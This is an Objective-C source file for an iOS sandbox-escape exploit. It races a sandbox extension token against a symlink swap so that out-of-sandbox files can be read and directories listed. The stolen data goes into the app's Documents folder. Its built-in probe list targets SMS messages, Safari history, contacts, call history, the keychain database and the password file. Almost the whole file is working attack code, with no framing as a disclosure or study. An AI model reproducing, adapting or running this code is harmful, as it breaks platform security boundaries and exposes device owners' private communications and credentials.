// Sbx.m - sandbox_extension TOCTOU reader
//
// Two issue modes, because the extension carries the type of the path it was
// minted for:
//   file mode : symlink -> a regular file we own  -> grants "read this file"
//   dir  mode : symlink -> a directory we own     -> grants "read this dir"
// A token minted in file mode still lets us read out-of-sandbox files (the swap
// wins), but opendir() on a directory is refused (EPERM) because the extension
// does not carry directory enumeration. dir mode is the fix for that.
//
// Queue: Documents/sbx.txt, one line: tag<TAB>absolute-path
// Every item is attempted in both modes, tagged <tag>#f and <tag>#d.

#import "Sbx.h"

#import <dirent.h>
#import <errno.h>
#import <fcntl.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>

extern char   *sandbox_extension_issue_file(const char *cls, const char *path, uint64_t flags);
extern int64_t sandbox_extension_consume(const char *token);
extern void    sandbox_extension_release(int64_t handle);

static NSString *gSbxDocs;
static NSString *gSbxOut;
static NSMutableArray *gSbxProduced;
static NSMutableArray *gSbxSummary;

// One line per attempt, fixed width so it reads well on a phone screen.
static void sbxNote(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [gSbxSummary addObject:s];
    NSLog(@"[sbx] %@", s);
}

static void sbxLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbx] %@", s);

    NSString *p = [gSbxDocs stringByAppendingPathComponent:@"sbx.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:p];
    if (fh == nil) {
        [[NSFileManager defaultManager] createFileAtPath:p contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:p];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh closeFile];
}

static void sbxPut(NSString *name, NSData *data) {
    NSString *p = [gSbxOut stringByAppendingPathComponent:name];
    if ([data writeToFile:p atomically:YES]) [gSbxProduced addObject:name];
}

#pragma mark - listing

static void tryList(NSString *tag, const char *linkPath) {
    DIR *dp = opendir(linkPath);
    if (dp == NULL) {
        int e1 = errno;
        int fd = open(linkPath, O_RDONLY | O_DIRECTORY);
        if (fd >= 0) {
            dp = fdopendir(fd);
            if (dp == NULL) close(fd);
        }
        if (dp == NULL) {
            sbxNote(@"FAIL %-16s opendir e%d open/dir e%d", [tag UTF8String], e1, errno);
            return;
        }
        sbxLog(@"DIR[%@] opendir failed (%d), open(O_DIRECTORY)+fdopendir ok", tag, e1);
    }

    NSMutableArray *names = [NSMutableArray array];
    struct dirent *de;
    while ((de = readdir(dp)) != NULL && names.count < 4000) {
        NSString *n = [NSString stringWithUTF8String:de->d_name];
        if (n != nil && ![n isEqualToString:@"."] && ![n isEqualToString:@".."]) {
            [names addObject:n];
        }
    }
    closedir(dp);

    NSArray *sorted = [names sortedArrayUsingSelector:@selector(compare:)];
    NSString *body = [[sorted componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
    sbxPut([tag stringByAppendingString:@".dir"], [body dataUsingEncoding:NSUTF8StringEncoding]);
    sbxNote(@"OK   %-16s dir %lu entries", [tag UTF8String], (unsigned long)names.count);
}

static void tryRead(NSString *tag, const char *linkPath, int64_t size) {
    int fd = open(linkPath, O_RDONLY);
    if (fd < 0) {
        sbxNote(@"FAIL %-16s open e%d", [tag UTF8String], errno);
        return;
    }
    NSMutableData *all = [NSMutableData data];
    unsigned char buf[65536];
    ssize_t got;
    while ((got = read(fd, buf, sizeof(buf))) > 0) {
        [all appendBytes:buf length:(NSUInteger)got];
        if (all.length > 8 * 1000 * 1000) break;
    }
    close(fd);
    sbxPut([tag stringByAppendingString:@".bin"], all);
    sbxNote(@"OK   %-16s %lu B", [tag UTF8String], (unsigned long)all.length);
}

#pragma mark - one attempt

static void sbxOne(NSString *tag, NSString *target, BOOL dirMode) {
    NSString *tmp = NSTemporaryDirectory();
    NSString *s = [tmp stringByAppendingPathComponent:@"s"];      // file target
    NSString *d = [tmp stringByAppendingPathComponent:@"d"];      // dir target
    NSString *l = [tmp stringByAppendingPathComponent:@"l"];      // the symlink

    if (dirMode) {
        [[NSFileManager defaultManager] createDirectoryAtPath:d
                                 withIntermediateDirectories:YES attributes:nil error:nil];
    } else {
        [[@"x" dataUsingEncoding:NSUTF8StringEncoding] writeToFile:s atomically:YES];
    }

    unlink([l UTF8String]);
    if (symlink([(dirMode ? d : s) UTF8String], [l UTF8String]) != 0) {
        sbxLog(@"SETUP[%@] symlink failed errno=%d", tag, errno);
        return;
    }

    char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read",
                                              [l UTF8String], 0);
    if (token == NULL) {
        sbxLog(@"ISSUE[%@] NULL (dirMode=%d)", tag, (int)dirMode);
        sbxNote(@"FAIL %-16s issue=NULL", [tag UTF8String]);
        unlink([l UTF8String]);
        return;
    }
    sbxLog(@"ISSUE[%@] ok (dirMode=%d)", tag, (int)dirMode);

    unlink([l UTF8String]);
    if (symlink([target UTF8String], [l UTF8String]) != 0) {
        sbxLog(@"SWAP[%@] failed errno=%d", tag, errno);
        free(token);
        return;
    }

    int64_t h = sandbox_extension_consume(token);
    sbxLog(@"CONSUME[%@] handle=%lld", tag, h);

    struct stat st;
    if (stat([l UTF8String], &st) != 0) {
        sbxLog(@"STAT[%@] failed errno=%d (%s)", tag, errno, strerror(errno));
        sbxNote(@"FAIL %-16s stat e%d", [tag UTF8String], errno);
    } else {
        // Metadata is readable for any path, even where opendir() is refused,
        // so always record it: this doubles as an exists/type/size oracle.
        NSString *meta = [NSString stringWithFormat:
            @"path=%@\nmode=%o\nsize=%lld\nuid=%u\ngid=%u\nisDir=%d\n",
            target, st.st_mode, (long long)st.st_size, st.st_uid, st.st_gid,
            ((st.st_mode & 0170000) == 0040000) ? 1 : 0];
        sbxPut([tag stringByAppendingString:@".meta"],
               [meta dataUsingEncoding:NSUTF8StringEncoding]);

        if ((st.st_mode & 0170000) == 0040000) {
            tryList(tag, [l UTF8String]);
        } else {
            tryRead(tag, [l UTF8String], (int64_t)st.st_size);
        }
    }

    if (h > 0) sandbox_extension_release(h);
    free(token);
    unlink([l UTF8String]);
}

static void sbxBoth(NSString *tag, NSString *target) {
    sbxOne([tag stringByAppendingString:@"#f"], target, NO);
    sbxOne([tag stringByAppendingString:@"#d"], target, YES);
}

#pragma mark - entry

int sbxRun(void) {
    gSbxDocs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    gSbxOut = [gSbxDocs stringByAppendingPathComponent:@"out"];
    gSbxProduced = [NSMutableArray array];
    gSbxSummary = [NSMutableArray array];
    [[NSFileManager defaultManager] createDirectoryAtPath:gSbxOut
                             withIntermediateDirectories:YES attributes:nil error:nil];

    sbxLog(@"=== sbx start ===");

    NSString *q = [NSString stringWithContentsOfFile:[gSbxDocs stringByAppendingPathComponent:@"sbx.txt"]
                                            encoding:NSUTF8StringEncoding error:nil];
    if (q.length == 0) {
        sbxLog(@"sbx.txt empty: built-in probe set");
        // Directories: confirms the enumeration boundary (expected EPERM).
        sbxBoth(@"privetc",      @"/private/etc");
        sbxBoth(@"mobilelib",    @"/var/mobile/Library");
        sbxBoth(@"media",        @"/var/mobile/Media");
        sbxBoth(@"sysgroup",     @"/var/containers/Shared/SystemGroup");
        sbxBoth(@"appdata",      @"/var/mobile/Containers/Data/Application");
        // Files: the read primitive is unrestricted, so hit the interesting ones.
        sbxBoth(@"passwd",       @"/etc/passwd");
        sbxBoth(@"masterpasswd", @"/private/etc/master.passwd");
        sbxBoth(@"sms",          @"/var/mobile/Library/SMS/sms.db");
        sbxBoth(@"safarihist",   @"/var/mobile/Library/Safari/History.db");
        sbxBoth(@"addressbook",  @"/var/mobile/Library/AddressBook/AddressBook.sqlitedb");
        sbxBoth(@"callhistory",  @"/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
        sbxBoth(@"keychain",     @"/var/Keychains/keychain-2.db");
        sbxBoth(@"frontboard",   @"/var/mobile/Library/FrontBoard/applicationState.plist");
        sbxBoth(@"iconstate",    @"/var/mobile/Library/SpringBoard/IconState.plist");
        sbxBoth(@"globalprefs",  @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
        sbxBoth(@"networkd",     @"/var/preferences/com.apple.networkd.plist");
    } else {
        NSArray *lines = [q componentsSeparatedByString:@"\n"];
        for (NSString *line in lines) {
            if (line.length == 0) continue;
            NSArray *p = [line componentsSeparatedByString:@"\t"];
            if (p.count < 2) continue;
            sbxBoth(p[0], p[1]);
        }
    }

    NSString *idx = [gSbxProduced componentsJoinedByString:@"\n"];
    if (idx.length > 0) idx = [idx stringByAppendingString:@"\n"];
    [[idx dataUsingEncoding:NSUTF8StringEncoding]
        writeToFile:[gSbxOut stringByAppendingPathComponent:@"sbx_index.txt"] atomically:YES];

    NSMutableArray *sum = [NSMutableArray array];
    NSMutableArray *okLines = [NSMutableArray array];
    NSMutableArray *failLines = [NSMutableArray array];
    for (NSString *line in gSbxSummary) {
        if ([line hasPrefix:@"OK"]) [okLines addObject:line];
        else [failLines addObject:line];
    }
    [sum addObject:[NSString stringWithFormat:@"%lu hit / %lu attempts (%lu artifacts)",
                    (unsigned long)okLines.count, (unsigned long)gSbxSummary.count,
                    (unsigned long)gSbxProduced.count]];
    [sum addObjectsFromArray:okLines];
    [sum addObjectsFromArray:failLines];
    NSString *sumText = [[sum componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
    [[sumText dataUsingEncoding:NSUTF8StringEncoding]
        writeToFile:[gSbxDocs stringByAppendingPathComponent:@"sbx_summary.txt"] atomically:YES];

    sbxLog(@"=== sbx end, %lu artifacts ===", (unsigned long)gSbxProduced.count);
    return 0;
}
